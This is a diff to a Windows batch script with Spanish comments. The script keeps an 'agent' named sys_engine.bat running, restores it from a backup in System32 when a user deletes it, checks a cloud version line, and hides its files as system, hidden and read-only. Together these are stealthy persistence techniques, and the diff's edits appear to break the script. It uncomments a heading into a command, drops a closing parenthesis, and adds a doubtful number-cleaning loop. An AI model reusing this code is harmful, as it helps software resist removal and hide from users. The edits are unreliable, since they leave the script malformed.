@@ -21,7 +21,7 @@ tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
 if %errorlevel% neq 0 (
     start /b "" cmd /c "%AGENTE_FILE%"
 )
-::--- 4. RESTAURACIÓN Y EJECUCIÓN ---
+--- 4. RESTAURACIÓN Y EJECUCIÓN ---
 ::Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
 if not exist "%AGENTE_FILE%" (
     if not exist "%AGENTE_DIR%" mkdir "%AGENTE_DIR%" >nul 2>&1
@@ -42,10 +42,21 @@ for %%i in ("%VLINEA%") do if %%~zi == 0 (del "%VLINEA%" & exit)
 
 set /p LINEA_NUBE=<"%VLINEA%"
 :: 2. Comprobar si existe el archivo de memoria local
+::if exist "%VERSION_LOCAL%" (
+::    set /p LINEA_LOCAL=<"%VERSION_LOCAL%"
+::) else (
+::    copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
+::    set "LINEA_LOCAL=0"
+::)
 if exist "%VERSION_LOCAL%" (
-    set /p LINEA_LOCAL=<"%VERSION_LOCAL%"
+    set /p LINEA_RAW=<"%VERSION_LOCAL%"
+    
+    :: Limpieza Pro: Elimina espacios y cualquier carácter no numérico 
+    :: (Esto asumiendo que tus versiones son números enteros como 20, 21, etc.)
+    set "LINEA_LOCAL="
+    for /f "delims=0123456789" %%a in ("!LINEA_RAW!") do set "LINEA_RAW=!LINEA_RAW:%%a=!"
+    set "LINEA_LOCAL=!LINEA_RAW!"
 ) else (
-    copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
     set "LINEA_LOCAL=0"
 ) 
 if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
@@ -72,10 +83,6 @@ if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
     copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
             
     rem 2.3 RE-ACTIVACIÓN DE ESCUDOS
-    attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
-    attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
-        
-)
     attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
     attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
         
